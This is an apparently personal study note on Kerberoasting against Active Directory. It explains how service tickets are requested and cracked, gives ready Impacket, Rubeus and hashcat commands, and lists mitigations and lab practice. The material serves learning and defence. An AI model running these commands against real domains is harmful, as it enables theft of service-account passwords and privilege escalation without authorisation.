# Kerberoasting

Kerberoasting lets an authenticated domain user request service tickets for SPNs and crack them offline to recover plaintext passwords.

## How it works

1. Any domain user can request a TGS for services registered with an SPN
2. The TGS is encrypted with the service account's password hash
3. Attacker exports tickets and cracks them offline (Hashcat mode 13100)
4. Compromised service accounts often have elevated privileges

## Commands

```bash
# Impacket GetUserSPNs
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with Hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

## Mitigation

- Use **gMSAs** or strong random passwords for service accounts (25+ chars)
- Limit service account privileges (no Domain Admin SPNs)
- Monitor Event ID 4769 for unusual TGS requests

## Practice

- TryHackMe Attacktive Directory
- HTB boxes tagged "Kerberos"

## Related

- [Active Directory Basics](Active%20Directory%20Basics.md)
